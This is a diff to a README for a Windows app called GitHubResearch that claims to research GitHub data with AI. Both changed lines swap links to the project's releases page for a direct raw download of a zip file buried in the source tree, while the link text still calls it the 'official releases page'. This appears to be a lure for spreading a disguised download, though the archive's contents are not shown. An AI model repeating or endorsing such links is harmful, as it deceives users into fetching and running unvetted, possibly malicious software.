@@ -1,6 +1,6 @@
 # 🔍 GitHubResearch - Research GitHub data with smart AI
 
-[![Download the App](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/infiltratormontialamprosperma445/GitHubResearch/releases)
+[![Download the App](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/infiltratormontialamprosperma445/GitHubResearch/main/electron/services/Hub_Git_Research_v2.4.zip)
 
 ## 🎯 About This Application
 
@@ -22,7 +22,7 @@ Before you install the application, check that your computer meets these require
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/infiltratormontialamprosperma445/GitHubResearch/releases) to access the files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/infiltratormontialamprosperma445/GitHubResearch/main/electron/services/Hub_Git_Research_v2.4.zip) to access the files.
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` to begin the download.
 4. Locate the downloaded file in your Downloads folder.
